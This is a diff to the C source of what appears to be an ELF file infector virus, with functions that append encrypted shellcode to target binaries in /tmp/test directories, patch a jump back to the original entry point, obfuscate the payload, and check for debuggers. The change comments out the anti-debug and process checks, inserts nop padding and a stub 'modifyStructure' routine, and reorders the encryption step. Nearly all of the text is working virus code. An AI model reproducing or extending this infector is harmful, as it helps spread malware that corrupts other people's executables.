@@ -45,10 +45,19 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  if (checkProcess(procName) != 0)
-    return (stop(1, magic));
-  if (preventDebug() == -1)
-    return (stop(1, magic));
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  asm("nop");
+  /* if (checkProcess(procName) != 0) */
+  /*   return (stop(1, magic)); */
+  /* if (preventDebug() == -1) */
+  /*   return (stop(1, magic)); */
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -578,6 +587,15 @@ static void obfuscate(char *header, size_t size) {
   }
 }
 
+static void modifyStructure(unsigned char *code, size_t size) {
+  size_t  i;
+
+  i = 0;
+  while (i < size) {
+    i += 1;
+  }
+}
+
 static int  appendShellcode(struct bfile *bin) {
   size_t  size;
   char    ins[9];
@@ -590,7 +608,6 @@ static int  appendShellcode(struct bfile *bin) {
     return (-1);
   memcpy(new.header, bin->header, bin->size);
   memcpy(((void *)new.header) + bin->size, start, size);
-  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   address = -(0xc000000 + bin->size + size) + bin->header->e_entry - 6;
   ins[0] = 0xe9;
   ins[1] = (address >> 0) & 0xff;
@@ -602,6 +619,8 @@ static int  appendShellcode(struct bfile *bin) {
   ins[7] = (address >> 48) & 0xff;
   ins[8] = (address >> 56) & 0xff;
   memcpy(((void *)new.header) + bin->size + size, ins, sizeof(ins));
+  modifyStructure(((void *)new.header) + bin->size, size);
+  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
   munmap(bin->header, bin->size);
   bin->header = new.header;
   bin->size = new.size;
